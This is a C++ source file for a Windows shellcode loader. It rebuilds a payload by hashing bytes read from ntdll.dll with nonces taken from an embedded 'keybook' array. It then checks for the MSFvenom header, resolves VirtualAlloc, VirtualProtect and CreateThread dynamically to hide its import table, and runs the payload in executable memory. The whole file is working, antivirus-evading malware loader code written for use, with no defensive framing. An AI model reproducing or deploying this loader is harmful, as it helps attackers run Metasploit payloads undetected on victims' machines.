#include <windows.h>
#include <bcrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>

// Link the Cryptography Next Generation (CNG) library
#pragma comment(lib, "bcrypt.lib")

// --- DYNAMIC API TYPEDEFS ---
typedef LPVOID(WINAPI* PFUNC_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* PFUNC_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* PFUNC_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* PFUNC_WaitForSingleObject)(HANDLE, DWORD);

struct KeybookEntry {
    uint64_t nonce;
    int offset;
    int length;
};

std::string BytesToHexString(const std::vector<BYTE>& bytes) {
    std::ostringstream oss;
    for (BYTE b : bytes) {
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)b;
    }
    return oss.str();
}

std::vector<BYTE> HexStringToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        BYTE b = (BYTE)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(b);
    }
    return bytes;
}

int ExecuteStageTwo() {
    std::cout << "[*] Initiating Hash Frying Reconstructor (Diagnostic Ghost Mode)..." << std::endl;

    // 1. READ THE ENTROPY SOURCE
    const char* source_file = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hFile = CreateFileA(source_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] CRASH POINT: Cannot read entropy source." << std::endl;
        std::cin.get();
        return 1;
    }

    std::vector<BYTE> seed(5120);
    DWORD bytesRead;
    ReadFile(hFile, seed.data(), 5120, &bytesRead, NULL);
    CloseHandle(hFile);

    if (bytesRead != 5120) {
        std::cerr << "[!] CRASH POINT: Seed file altered or truncated." << std::endl;
        std::cin.get();
        return 1;
    }

    // ==========================================
    // PASTE YOUR EXTRACTED KEYBOOK ARRAY HERE
    // ==========================================
    std::vector<KeybookEntry> keybook = {
        {121908905, 39, 8},
        {10077592, 31, 8},
        {20884329, 109, 8},
        {5417402, 24, 8},
        {5022417, 94, 8},
        {26214488, 30, 8},
        {10596746, 62, 8},
        {23730462, 13, 8},
        {5384478, 35, 8},
        {11128952, 31, 8},
        {147428755, 56, 8},
        {4462361, 79, 8},
        {5328468, 1, 8},
        {86680469, 86, 8},
        {45318696, 12, 8},
        {23410211, 9, 8},
        {16148420, 10, 8},
        {20789604, 81, 8},
        {29011449, 11, 8},
        {18178085, 87, 8},
        {65259135, 33, 8},
        {94004753, 105, 8},
        {13349701, 3, 8},
        {14706910, 46, 8},
        {98503874, 32, 8},
        {76471086, 48, 8},
        {17187056, 115, 8},
        {36590674, 24, 8},
        {8221038, 101, 8},
        {4462361, 79, 8},
        {6101657, 37, 8},
        {46213964, 55, 8},
        {3600221, 79, 8},
        {35004005, 9, 8},
        {21993835, 3, 8},
        {20225341, 72, 8},
        {22555667, 96, 8},
        {40626536, 82, 8},
        {23205590, 3, 8},
        {55696190, 75, 8},
        {7446236, 17, 8},
        {18090545, 102, 8},
        {43667266, 19, 8},
        {54867057, 95, 8},
        {29124338, 103, 8},
        {68014116, 7, 8},
        {16389498, 57, 8},
        {12493528, 109, 8},
        {45674002, 105, 8},
        {9574135, 81, 8},
        {76548044, 26, 8},
        {2592599, 28, 8},
        {1475131, 10, 8},
        {25416337, 109, 8},
        {109998530, 43, 8},
        {64780330, 88, 8},
        {987268, 95, 8},
        {25942689, 40, 8},
        {33596916, 90, 8},
        {11359987, 87, 8},
        {19898282, 7, 8},
        {83707112, 94, 8},
        {6874581, 18, 8},
        {38979497, 16, 8},
        {30001889, 5, 8},
        {1062836, 72, 8},
        {25644487, 118, 8},
        {1132045, 110, 8},
        {10384794, 90, 8}
    };
    // ==========================================

    if (keybook.empty()) {
        std::cerr << "[!] CRASH POINT: Keybook is empty. Did you forget to paste the array?" << std::endl;
        std::cin.get();
        return 1;
    }

    std::vector<BYTE> final_shellcode;

    // 2. INITIALIZE BCRYPT
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA512_ALGORITHM, NULL, 0);

    DWORD cbHashObject = 0, cbData = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
    std::vector<BYTE> pbHashObject(cbHashObject);
    std::vector<BYTE> pbHash(64);

    // 3. THE ASSEMBLY LOOP
    std::cout << "[*] Extracting Shellcode from Environment..." << std::endl;
    for (const auto& key : keybook) {
        BCRYPT_HASH_HANDLE hHash = NULL;
        BCryptCreateHash(hAlg, &hHash, pbHashObject.data(), cbHashObject, NULL, 0, 0);

        std::string nonce_str = std::to_string(key.nonce);
        BCryptHashData(hHash, seed.data(), seed.size(), 0);
        BCryptHashData(hHash, (PUCHAR)nonce_str.c_str(), nonce_str.length(), 0);
        BCryptFinishHash(hHash, pbHash.data(), pbHash.size(), 0);
        BCryptDestroyHash(hHash);

        std::string full_hash_hex = BytesToHexString(pbHash);
        std::string hex_fragment = full_hash_hex.substr(key.offset, key.length);
        std::vector<BYTE> raw_bytes = HexStringToBytes(hex_fragment);

        final_shellcode.insert(final_shellcode.end(), raw_bytes.begin(), raw_bytes.end());
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);

    // --- SANITY CHECK ---
    std::string test_hex = BytesToHexString(final_shellcode);
    if (test_hex.substr(0, 10) != "fc4883e4f0") {
        std::cout << "\n[!] CRASH POINT: Math Mismatch! GPU output does not match MSFvenom header." << std::endl;
        std::cin.get();
        return 1;
    }
    std::cout << "[+] Math verified. MSFvenom header detected." << std::endl;

    // 4. DYNAMIC API RESOLUTION
    std::cout << "[*] Obfuscating IAT via Dynamic Resolution..." << std::endl;

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    PFUNC_VirtualAlloc pVirtualAlloc = (PFUNC_VirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    PFUNC_VirtualProtect pVirtualProtect = (PFUNC_VirtualProtect)GetProcAddress(hKernel32, "VirtualProtect");
    PFUNC_CreateThread pCreateThread = (PFUNC_CreateThread)GetProcAddress(hKernel32, "CreateThread");
    PFUNC_WaitForSingleObject pWaitForSingleObject = (PFUNC_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");

    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject) {
        std::cerr << "[!] CRASH POINT: Failed to dynamically resolve APIs." << std::endl;
        std::cin.get();
        return 1;
    }

    // 5. INVISIBLE EXECUTION
    std::cout << "[*] Allocating Executable Memory..." << std::endl;

    void* exec_mem = pVirtualAlloc(0, final_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec_mem, final_shellcode.data(), final_shellcode.size());

    DWORD oldProtect;
    pVirtualProtect(exec_mem, final_shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

    // --- THE TRIPWIRE ---
    std::cout << "[!] System Ready. Memory Allocated and Protected." << std::endl;
    std::cout << "[?] PRESS ENTER TO PULL THE TRIGGER..." << std::endl;
    std::cin.get();

    std::cout << "[!] Detonating Shellcode via Dynamic CreateThread..." << std::endl;

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);

    if (hThread == NULL) {
        std::cerr << "[!] CRASH POINT: CreateThread failed to launch the payload." << std::endl;
        std::cin.get();
        return 1;
    }

    std::cout << "[*] Thread created successfully. Waiting for payload execution..." << std::endl;
    // Increased wait time to 5 seconds to ensure slow threads have time to pop
    pWaitForSingleObject(hThread, 5000);

    std::cout << "[+] Execution sequence completed. PRESS ENTER TO EXIT." << std::endl;
    std::cin.get();
    return 0;
}